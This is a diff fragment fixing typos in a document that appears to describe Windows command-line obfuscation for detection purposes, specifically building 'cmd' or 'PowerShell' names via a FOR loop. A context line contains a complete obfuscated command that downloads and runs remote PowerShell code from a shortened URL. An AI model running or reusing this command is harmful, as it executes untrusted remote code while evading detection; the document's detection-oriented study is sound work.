@@ -108,7 +108,7 @@ So this subtype of binary obfuscation is considered out of scope for this issue.
 
 #### For Loop
 
-It is possible to construct a binary name like `cmd` or `PowerShell` in memory that does not resolve on `cmd.exe`’scommand line upon execution, evading both static and dynamic detections focusing on the presence of these values. But in the last child Process Creation Windows Event Llog Security Event ID 4688 existing environment variables resolve to their underlying value. E.g. if we'll use this example command:
+It is possible to construct a binary name like `cmd` or `PowerShell` in memory that does not resolve on `cmd.exe`’s command line upon execution, evading both static and dynamic detections focusing on the presence of these values. But in the last child Process Creation Windows Event Log Security Event ID 4688 existing environment variables resolve to their underlying value. E.g. if we'll use this example command:
 
 ```CMD
 cmd /c "FOR /F "delims=6M. tokens=2" %Z IN ('ftype^|findstr lMo')DO %Z IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/L3g1t')"
